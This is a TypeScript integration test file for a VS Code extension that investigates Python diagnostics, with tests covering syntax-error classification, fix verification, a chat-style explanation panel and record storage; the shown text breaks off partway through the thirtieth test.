import * as assert from "assert";
import * as path from "path";
import * as vscode from "vscode";
import { EngineBridge } from "../engineBridge";
import { CompilerMateQuickFixProvider } from "../quickFixProvider";
import { InvestigationViewProvider } from "../resultsPanel";
import { InvestigationStore } from "../investigationStore";
import { VerificationEngine, applyEditsToText } from "../verificationEngine";
import {
  InvestigationRequest,
  InteractionRequest,
  InteractionResponse,
  ChatMessage,
  CandidateFix,
  DiagnosticInput,
  InvestigationResult,
  InvestigationRecord,
} from "../types";

// Mock OutputChannel
class MockOutputChannel {
  public logs: string[] = [];
  public name = "MockCompilerMate";
  public append(value: string) { this.logs.push(value); }
  public appendLine(value: string) { this.logs.push(value + "\n"); }
  public clear() { this.logs = []; }
  public show() {}
  public hide() {}
  public dispose() {}
  public replace() {}
}

// Mock ExtensionContext with in-memory storage and state
const mockState = new Map<string, any>();
const mockContext: any = {
  extensionPath: path.resolve(__dirname, "..", ".."),
  extensionUri: { fsPath: path.resolve(__dirname, "..", "..") },
  subscriptions: [],
  workspaceState: {
    get: (key: string, defaultValue?: any) => (mockState.has(key) ? mockState.get(key) : defaultValue),
    update: async (key: string, value: any) => {
      if (value === undefined) mockState.delete(key);
      else mockState.set(key, value);
    },
  },
  globalStorageUri: { fsPath: path.resolve(__dirname, "..", "..", ".test_storage") },
};

export async function runBridgeTests(): Promise<number> {
  const channel = new MockOutputChannel();
  const bridge = new EngineBridge(channel as any);
  let passed = 0;
  let failed = 0;

  async function test(name: string, fn: () => Promise<void>) {
    try {
      await fn();
      console.log(`  ✓ ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ✗ ${name}`);
      console.error(err);
      failed++;
    }
  }

  console.log("Running EngineBridge Integration Tests:");

  // Test 1: Python path detection
  await test("EngineBridge discovers Python executable", async () => {
    const pythonPath = await bridge.getPythonPath();
    assert.ok(pythonPath, "Python path should not be empty");
    assert.ok(pythonPath.includes("python") || pythonPath.includes(".exe"), "Should contain python");
  });

  // Test 2: Engine directory resolution
  await test("EngineBridge resolves compilermate_engine directory", async () => {
    const dir = bridge.getEngineDirectory(mockContext);
    assert.ok(dir, "Engine dir should not be empty");
    assert.ok(dir.includes("engine"), "Path should contain engine");
  });

  // Test 3: Unclosed Delimiter investigation
  await test("Investigates unclosed delimiter with cause-vs-symptom", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "UNCLOSED_DELIMITER");
    assert.ok(res.explanation?.cause_vs_symptom?.includes("secondary symptom"));
    assert.ok(res.candidate_fixes.length >= 1);
    const verified = res.candidate_fixes.filter(f => f.verification.status === "PARTIALLY_VERIFIED" || f.verification.status === "VERIFIED");
    assert.ok(verified.length >= 1, "At least one verified or partially verified fix must be returned");
  });

  // Test 4: Missing Colon investigation
  await test("Investigates missing colon in function definition", async () => {
    const code = "def calculate(a, b)\n    return a + b\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: expected ':'",
        range: { start: { line: 0, character: 13 }, end: { line: 0, character: 13 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "MISSING_COLON");
    assert.strictEqual(res.candidate_fixes[0].edits[0].new_text, ":");
    assert.ok(["PARTIALLY_VERIFIED", "VERIFIED"].includes(res.candidate_fixes[0].verification.status));
    assert.ok(res.candidate_fixes[0].diff?.includes("+def calculate(a, b):"));
  });

  // Test 5: Indentation error investigation
  await test("Investigates expected indented block", async () => {
    const code = "def compute():\nprint(123)\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "IndentationError: expected an indented block after function definition on line 1",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 5 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "INDENTATION_EXPECTED_BLOCK");
    assert.ok(res.candidate_fixes.length >= 1);
  });

  // Test 6: Unterminated string literal
  await test("Investigates unterminated string literal", async () => {
    const code = "greeting = \"Hello world\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: unterminated string literal (detected at line 1)",
        range: { start: { line: 0, character: 11 }, end: { line: 0, character: 23 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "UNTERMINATED_STRING");
    assert.strictEqual(res.candidate_fixes[0].edits[0].new_text, "\"");
    assert.ok(["PARTIALLY_VERIFIED", "VERIFIED"].includes(res.candidate_fixes[0].verification.status));
  });

  // Test 7: Undefined name typo
  await test("Investigates undefined name typo", async () => {
    const code = "counter = 42\ntotal = countr + 1\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "'countr' is not defined",
        range: { start: { line: 1, character: 8 }, end: { line: 1, character: 14 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "UNDEFINED_NAME");
    assert.strictEqual(res.candidate_fixes[0].edits[0].new_text, "counter");
    assert.ok(["PARTIALLY_VERIFIED", "VERIFIED"].includes(res.candidate_fixes[0].verification.status));
  });

  // Test 8: Unused import
  await test("Investigates unused import diagnostic", async () => {
    const code = "import sys\n\ndef main():\n    pass\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "'sys' is not accessed",
        code: "reportUnusedImport",
        range: { start: { line: 0, character: 7 }, end: { line: 0, character: 10 } },
        severity: 2
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "UNUSED_IMPORT");
    assert.strictEqual(res.candidate_fixes[0].edits[0].new_text, "");
    assert.ok(["PARTIALLY_VERIFIED", "VERIFIED"].includes(res.candidate_fixes[0].verification.status));
  });

  // Test 9: Unsupported diagnostic
  await test("Handles unsupported diagnostic gracefully", async () => {
    const code = "x = 10\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "Some random third party lint warning XYZ",
        range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
        severity: 2
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "unsupported");
    assert.strictEqual(res.category, "UNSUPPORTED");
    assert.strictEqual(res.candidate_fixes.length, 0);
  });

  // Test 10: Unicode in document
  await test("Handles Unicode characters without offset corruption", async () => {
    const code = "msg = 'Hello, 世界!\ndef foo()\n    pass\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: expected ':'",
        range: { start: { line: 1, character: 9 }, end: { line: 1, character: 9 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.strictEqual(res.category, "MISSING_COLON");
  });

  // Test 11: Candidate fix contains unified diff and verification checks
  await test("Fixes contain valid unified diff and multi-stage verification checks", async () => {
    const code = "val = 'unterminated string\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: unterminated string literal",
        range: { start: { line: 0, character: 6 }, end: { line: 0, character: 26 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    assert.strictEqual(res.status, "success");
    assert.ok(res.candidate_fixes.length >= 1);
    const fix = res.candidate_fixes[0];
    assert.ok(fix.diff, "Candidate fix must contain diff");
    assert.ok(fix.diff.includes("--- current"));
    assert.ok(fix.diff.includes("+++ proposed_fix"));
    assert.ok(fix.verification.checks.length >= 2);
  });

  // Test 12: Stale document version protection contract
  await test("Rejects applying fixes when document version is stale", async () => {
    const originalVersion = 1;
    const modifiedVersion = 2;
    // Emulates the version-mismatch guard in extension.ts
    const applyWithVersionCheck = (expectedVersion: number, currentVersion: number) => {
      if (expectedVersion !== undefined && currentVersion !== expectedVersion) {
        return false; // Stale rejected
      }
      return true;
    };
    assert.strictEqual(applyWithVersionCheck(originalVersion, originalVersion), true, "Fresh document version must be accepted");
    assert.strictEqual(applyWithVersionCheck(originalVersion, modifiedVersion), false, "Stale document version must be rejected");
  });

  // Test 13: Missing/Invalid Python interpreter handling
  await test("Handles missing or invalid Python interpreter gracefully", async () => {
    (global as any).__COMPILERMATE_MOCK_CONFIG__["compilermate.pythonPath"] = "non_existent_python_binary_xyz_12345";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: "x = 10\n", language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    delete (global as any).__COMPILERMATE_MOCK_CONFIG__["compilermate.pythonPath"];
    assert.strictEqual(res.status, "error");
    assert.strictEqual(res.category, "SPAWN_ERROR");
    assert.ok(res.error_message?.includes("Failed to launch Python"));
  });

  // Test 14: Engine timeout handling
  await test("Handles engine timeout gracefully", async () => {
    (global as any).__COMPILERMATE_MOCK_CONFIG__["compilermate.timeoutMs"] = 1; // 1ms timeout guarantees trigger
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: "x = 10\n", language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
        severity: 1
      }
    };
    const res = await bridge.investigate(mockContext, req);
    delete (global as any).__COMPILERMATE_MOCK_CONFIG__["compilermate.timeoutMs"];
    assert.strictEqual(res.status, "error");
    assert.strictEqual(res.category, "TIMEOUT");
    assert.ok(res.error_message?.includes("timed out"));
  });

  // Test 15: QuickFixProvider generates RPC-safe string URI and diagnostic payload
  await test("QuickFixProvider generates safe serializable arguments for command invocation", async () => {
    const provider = new CompilerMateQuickFixProvider();
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/test.py", fsPath: "d:/test.py" },
      getText: () => "x = [1, 2\n",
    };
    const mockDiag: any = {
      message: "'[' was not closed",
      range: {
        start: { line: 0, character: 4 },
        end: { line: 0, character: 5 },
      },
      severity: 0,
      source: "Python",
    };
    const actions = provider.provideCodeActions(
      mockDoc,
      mockDiag.range,
      { diagnostics: [mockDiag] } as any,
      {} as any
    );
    assert.strictEqual(actions.length, 1);
    const action = actions[0];
    assert.ok(action.command, "Action must have a command");
    assert.strictEqual(action.command!.command, "compilermate.investigateDiagnostic");
    assert.ok(action.command!.arguments, "Action command must have arguments");
    assert.strictEqual(typeof action.command!.arguments![0], "string", "Argument 0 must be serializable URI string");
    assert.strictEqual(action.command!.arguments![0], "file:///d:/test.py");
    assert.strictEqual(action.command!.arguments![1].message, "'[' was not closed");
    assert.strictEqual(action.command!.arguments![1].range.start.line, 0);
  });

  // Test 16: InvestigationViewProvider handles lazy initialization without existing _view
  await test("InvestigationViewProvider reveals panel and buffers results without existing _view", async () => {
    let fixApplied = false;
    const viewProvider = new InvestigationViewProvider(
      mockContext.extensionUri,
      async () => { fixApplied = true; return true; },
      async () => {}
    );
    // Call showLoading and updateResult when _view is initially undefined
    await viewProvider.showLoading("'[' was not closed");
    const mockResult: any = {
      status: "success",
      category: "UNCLOSED_DELIMITER",
      diagnostic: {
        message: "'[' was not closed",
        range: { start: { line: 0, character: 4 }, end: { line: 0, character: 5 } },
        severity: 1,
      },
      explanation: { summary: "Unclosed bracket", details: "Details here" },
      evidence: [],
      candidate_fixes: [
        {
          id: "fix-1",
          title: "Insert ']'",
          description: "Close bracket",
          edits: [],
          verification: { status: "VERIFIED", checks: [], limitation: "" },
          diff: "--- current\n+++ proposed\n",
        },
      ],
      metadata: {},
    };
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/test.py", fsPath: "d:/test.py" },
      version: 1,
    };
    await viewProvider.updateResult(mockResult, mockDoc);
    // Simulate VS Code resolving the webview view subsequently
    let renderedHtml = "";
    const mockWebviewView: any = {
      webview: {
        options: {},
        set html(val: string) { renderedHtml = val; },
        get html() { return renderedHtml; },
        onDidReceiveMessage: () => {},
      },
      show: () => {},
    };
    viewProvider.resolveWebviewView(mockWebviewView, {} as any, {} as any);
    assert.ok(renderedHtml.includes("UNCLOSED_DELIMITER"), "Resolved webview must render the buffered result");
    assert.ok(
      renderedHtml.includes("Insert ']'") || renderedHtml.includes("Insert &#039;]&#039;"),
      "Must render candidate fixes"
    );
    assert.ok(renderedHtml.includes("Proposed Source Diff"), "Must render diff");

    // Verify fixApplied callback can be invoked
    await (viewProvider as any)._onApplyFix("fix-1");
    assert.strictEqual(fixApplied, true, "Apply fix callback should be triggered");
  });

  // Test 17: InvestigationViewProvider handles applied fix and resolved states
  await test("InvestigationViewProvider renders applied fix and resolved states", async () => {
    const viewProvider = new InvestigationViewProvider(
      mockContext.extensionUri,
      async () => true,
      async () => {}
    );
    let currentHtml = "";
    const mockWebviewView: any = {
      webview: {
        options: {},
        set html(val: string) { currentHtml = val; },
        get html() { return currentHtml; },
        onDidReceiveMessage: () => {},
      },
      show: () => {},
    };
    viewProvider.resolveWebviewView(mockWebviewView, {} as any, {} as any);

    // 1. Test showAppliedFix
    viewProvider.showAppliedFix("Insert ':' at end of line", 2);
    assert.ok(currentHtml.includes("Correction Applied Successfully"), "Must display success banner");
    assert.ok(
      currentHtml.includes("Insert &#039;:&#039;") || currentHtml.includes("Insert ':'"),
      "Must show applied fix title"
    );

    // 2. Test showResolvedState
    viewProvider.showResolvedState("All diagnostics resolved! No remaining syntax errors.");
    assert.ok(currentHtml.includes("All Diagnostics Resolved"), "Must display all diagnostics resolved");
    assert.ok(currentHtml.includes("No remaining syntax errors"), "Must include resolution message");
  });

  // Test 18: EngineBridge interact handles root cause inquiry
  await test("EngineBridge interact handles root cause inquiry", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "Why is this the root cause?",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(intRes.message.length > 20);
    assert.ok(
      intRes.message.toLowerCase().includes("bracket") ||
      intRes.message.toLowerCase().includes("delimiter") ||
      intRes.message.toLowerCase().includes("line 1")
    );
  });

  // Test 19: EngineBridge interact explains cause vs. symptom latency
  await test("EngineBridge interact explains cause vs. symptom latency", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "Why does the error line differ from the unclosed delimiter?",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(
      intRes.message.toLowerCase().includes("symptom") ||
      intRes.message.toLowerCase().includes("lookahead") ||
      intRes.message.toLowerCase().includes("parser")
    );
  });

  // Test 20: EngineBridge interact provides simpler layman terms
  await test("EngineBridge interact provides simpler explanation with analogies", async () => {
    const code = "def calculate(a, b)\n    return a + b\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: expected ':'",
        range: { start: { line: 0, character: 13 }, end: { line: 0, character: 13 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "Can you explain this in simpler terms for a beginner?",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(
      intRes.message.toLowerCase().includes("simple terms") ||
      intRes.message.toLowerCase().includes("think of it") ||
      intRes.message.toLowerCase().includes("colon")
    );
  });

  // Test 21: EngineBridge interact handles alternative fixes inquiry and returns action
  await test("EngineBridge interact suggests alternative candidate fixes", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "What other ways can I fix this? Can you switch to another fix?",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(
      intRes.message.toLowerCase().includes("candidate") ||
      intRes.message.toLowerCase().includes("fix")
    );
    assert.ok(intRes.action === "select_fix" || intRes.action === "none");
  });

  // Test 22: EngineBridge interact compares fix trade-offs
  await test("EngineBridge interact compares candidate fix trade-offs", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "Which fix is safer? Compare the trade-offs.",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(
      intRes.message.toLowerCase().includes("trade-off") ||
      intRes.message.toLowerCase().includes("safe") ||
      intRes.message.toLowerCase().includes("recommended")
    );
  });

  // Test 23: EngineBridge interact handles multi-turn conversation maintaining history
  await test("EngineBridge interact maintains multi-turn conversation context", async () => {
    const code = "greeting = 'Hello world\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: unterminated string literal",
        range: { start: { line: 0, character: 11 }, end: { line: 0, character: 23 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    const history: ChatMessage[] = [
      { role: "user", content: "What is the problem here?" },
      { role: "assistant", content: "The single quote on line 1 was never closed." },
    ];

    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "How can I fix it?",
      history: history,
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.ok(intRes.message.length > 10);
  });

  // Test 24: EngineBridge interact re-investigate request
  await test("EngineBridge interact signals reinvestigate action", async () => {
    const code = "x = 10\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
        severity: 1,
      },
    };
    const intReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: { status: "unsupported", category: "UNSUPPORTED" },
      user_message: "Please re-investigate the document.",
      history: [],
    };
    const intRes = await bridge.interact(mockContext, intReq);
    assert.strictEqual(intRes.status, "success");
    assert.strictEqual(intRes.action, "reinvestigate");
  });

  // Test 25: InvestigationViewProvider handles conversational dialogue and prompt pills
  await test("InvestigationViewProvider renders dialogue UI and handles chat messages", async () => {
    let capturedQuestion = "";
    const mockOnSendMessage = async (userMsg: string, _history: ChatMessage[]): Promise<InteractionResponse> => {
      capturedQuestion = userMsg;
      return {
        status: "success",
        message: `CompilerMate analysis for: ${userMsg}`,
        action: "none",
      };
    };

    const viewProvider = new InvestigationViewProvider(
      mockContext.extensionUri,
      async () => true,
      async () => {},
      mockOnSendMessage
    );

    let currentHtml = "";
    let messageListener: ((msg: any) => Promise<void>) | undefined;
    const mockWebviewView: any = {
      webview: {
        options: {},
        set html(val: string) { currentHtml = val; },
        get html() { return currentHtml; },
        onDidReceiveMessage: (handler: any) => { messageListener = handler; },
      },
      show: () => {},
    };
    viewProvider.resolveWebviewView(mockWebviewView, {} as any, {} as any);

    const mockResult: any = {
      status: "success",
      category: "UNCLOSED_DELIMITER",
      diagnostic: {
        message: "'[' was not closed",
        range: { start: { line: 0, character: 4 }, end: { line: 0, character: 5 } },
        severity: 1,
      },
      explanation: { summary: "Unclosed bracket", details: "Details here" },
      evidence: [],
      candidate_fixes: [
        {
          id: "fix-close-bracket",
          title: "Close bracket on line 1",
          description: "Append ']'",
          edits: [],
          verification: { status: "VERIFIED", checks: [], limitation: "" },
        },
      ],
      metadata: {},
    };
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/test.py", fsPath: "d:/test.py" },
      version: 1,
    };
    await viewProvider.updateResult(mockResult, mockDoc);

    // Verify dialogue UI is present in initial render
    assert.ok(currentHtml.includes("Talk through this issue"), "HTML must contain neutral conversation header");
    assert.ok(currentHtml.includes("askQuestion('why')"), "HTML must contain keyword-first prompt");
    assert.ok(currentHtml.includes("chat-input-bar"), "HTML must contain chat input bar");

    // Simulate sending a chat message through the webview
    assert.ok(messageListener, "Message listener must be registered");
    await messageListener!({ command: "chatMessage", text: "Why is line 1 the root cause?" });

    assert.strictEqual(capturedQuestion, "Why is line 1 the root cause?");
    assert.ok(currentHtml.includes("Why is line 1 the root cause?"), "Rendered HTML must contain user question");
    assert.ok(currentHtml.includes("CompilerMate analysis for: Why is line 1 the root cause?"), "Rendered HTML must contain assistant response");
  });

  // Test 26: InvestigationViewProvider handles candidate fix selection and highlight
  await test("InvestigationViewProvider highlights selected fix card", async () => {
    const viewProvider = new InvestigationViewProvider(
      mockContext.extensionUri,
      async () => true,
      async () => {}
    );

    let currentHtml = "";
    let messageListener: ((msg: any) => Promise<void>) | undefined;
    const mockWebviewView: any = {
      webview: {
        options: {},
        set html(val: string) { currentHtml = val; },
        get html() { return currentHtml; },
        onDidReceiveMessage: (handler: any) => { messageListener = handler; },
      },
      show: () => {},
    };
    viewProvider.resolveWebviewView(mockWebviewView, {} as any, {} as any);

    const mockResult: any = {
      status: "success",
      category: "UNCLOSED_DELIMITER",
      diagnostic: {
        message: "'[' was not closed",
        range: { start: { line: 0, character: 4 }, end: { line: 0, character: 5 } },
        severity: 1,
      },
      explanation: { summary: "Unclosed bracket" },
      evidence: [],
      candidate_fixes: [
        {
          id: "fix-1",
          title: "Fix Option 1",
          description: "First option",
          edits: [],
          verification: { status: "VERIFIED", checks: [], limitation: "" },
        },
        {
          id: "fix-2",
          title: "Fix Option 2",
          description: "Second option",
          edits: [],
          verification: { status: "VERIFIED", checks: [], limitation: "" },
        },
      ],
      metadata: {},
    };
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/test.py", fsPath: "d:/test.py" },
      version: 1,
    };
    await viewProvider.updateResult(mockResult, mockDoc);

    // Initial selected fix is fix-1
    assert.ok(currentHtml.includes("fix-selected"), "First fix should initially be selected");

    // Send selectFix message for fix-2
    await messageListener!({ command: "selectFix", fixId: "fix-2" });
    assert.ok(currentHtml.includes("Fix Option 2"), "Fix Option 2 must be present");
  });

  // Test 27: InvestigationStore creates, saves, lists, and retrieves records
  await test("InvestigationStore creates, saves, lists, and retrieves records", async () => {
    const store = new InvestigationStore(mockContext);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/main.py", fsPath: "d:/project/main.py" },
      version: 1,
      getText: () => "def greet(name)\n    print(name)\n",
    };
    const mockResult: InvestigationResult = {
      status: "success",
      category: "MISSING_COLON",
      diagnostic: {
        message: "SyntaxError: expected ':'",
        range: { start: { line: 0, character: 14 }, end: { line: 0, character: 14 } },
        severity: 1,
      },
      explanation: { summary: "Missing colon", details: "Function header missing ':'" },
      evidence: [
        {
          title: "Header missing colon",
          line: 1,
          column: 15,
          snippet: "def greet(name)",
          annotation: "Missing ':'",
          kind: "OBSERVED",
        },
      ],
      candidate_fixes: [
        {
          id: "fix-colon-1",
          title: "Insert ':' at end of line",
          description: "Appends ':'",
          edits: [
            {
              range: { start: { line: 0, character: 15 }, end: { line: 0, character: 15 } },
              new_text: ":",
            },
          ],
          verification: {
            status: "PARTIALLY_VERIFIED",
            checks: [
              { name: "Lexical Tokenization", passed: true, status: "PASSED", message: "Tokenized cleanly" },
              { name: "AST Syntax Parse", passed: true, status: "PASSED", message: "Valid AST" },
            ],
            limitation: "Static syntax only; automated tests not run.",
          },
        },
      ],
      metadata: { source_sha256: "abcdef1234567890" },
    };

    const record = store.createRecord(mockResult, mockDoc);
    assert.ok(record.id.startsWith("inv-"), "Record ID should start with inv-");
    assert.strictEqual(record.status, "PARTIALLY_VERIFIED");
    assert.strictEqual(record.decision_status, "PENDING");
    assert.strictEqual(record.applied_diff, null);
    assert.strictEqual(record.source_hash, "abcdef1234567890");

    await store.saveRecord(record);

    const retrieved = await store.getRecord(record.id);
    assert.ok(retrieved, "Retrieved record should exist");
    assert.strictEqual(retrieved!.id, record.id);
    assert.strictEqual(retrieved!.category, "MISSING_COLON");
    assert.strictEqual(retrieved!.candidate_fixes.length, 1);

    const list = await store.listRecords();
    assert.ok(list.some((e) => e.id === record.id), "Record should be present in listed records");
  });

  // Test 28: InvestigationStore persists evidence classifications and source hash
  await test("InvestigationStore persists evidence classifications (OBSERVED, INFERRED, UNVERIFIED) and source hash", async () => {
    const store = new InvestigationStore(mockContext);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/calc.py", fsPath: "d:/project/calc.py" },
      version: 1,
      getText: () => "x = 10\ny = countr + 1\n",
    };
    const mockResult: InvestigationResult = {
      status: "success",
      category: "UNDEFINED_NAME",
      diagnostic: {
        message: "'countr' is not defined",
        range: { start: { line: 1, character: 4 }, end: { line: 1, character: 10 } },
        severity: 1,
      },
      evidence: [
        { title: "Direct diagnostic token", line: 2, column: 5, snippet: "countr", annotation: "Undefined name", kind: "OBSERVED" },
        { title: "Matching symbol candidate", line: 1, column: 1, snippet: "counter = 42", annotation: "Levenshtein distance 1", kind: "INFERRED" },
        { title: "Runtime global check", line: 2, column: 5, snippet: "countr", annotation: "Unverified runtime globals", kind: "UNVERIFIED" },
      ],
      candidate_fixes: [],
      metadata: {},
    };

    const record = store.createRecord(mockResult, mockDoc);
    assert.ok(record.source_hash.length === 64, "Source hash should be 64-char SHA-256");
    assert.strictEqual(record.evidence.length, 3);
    assert.strictEqual(record.evidence[0].kind, "OBSERVED");
    assert.strictEqual(record.evidence[1].kind, "INFERRED");
    assert.strictEqual(record.evidence[2].kind, "UNVERIFIED");

    await store.saveRecord(record);
    const loaded = await store.getRecord(record.id);
    assert.ok(loaded);
    assert.strictEqual(loaded!.evidence[1].kind, "INFERRED");
    assert.strictEqual(loaded!.evidence[2].kind, "UNVERIFIED");
  });

  // Test 29: VerificationEngine dry-run edit simulation
  await test("applyEditsToText simulates in-memory edits without offset corruption", async () => {
    const original = "def add(a, b)\n    return a + b\n";
    const edits = [
      {
        range: { start: { line: 0, character: 13 }, end: { line: 0, character: 13 } },
        new_text: ":",
      },
    ];
    const patched = applyEditsToText(original, edits);
    assert.strictEqual(patched, "def add(a, b):\n    return a + b\n");

    // Multiple reverse-sorted edits
    const multiOriginal = "foo(1, 2\nbar(3, 4\n";
    const multiEdits = [
      { range: { start: { line: 0, character: 8 }, end: { line: 0, character: 8 } }, new_text: ")" },
      { range: { start: { line: 1, character: 8 }, end: { line: 1, character: 8 } }, new_text: ")" },
    ];
    const multiPatched = applyEditsToText(multiOriginal, multiEdits);
    assert.strictEqual(multiPatched, "foo(1, 2)\nbar(3, 4)\n");
  });

  // Test 30: VerificationEngine verifyFix accurately reports multi-stage checks and marks unexecuted tests as NOT_CHECKED
  await test("VerificationEngine verifyFix accurately reports multi-stage checks and marks unexecuted tests as NOT_CHECKED", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/app.py", fsPath: "d:/project/app.py" },
      getText: () => "def greet(name)\n    print(name)\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
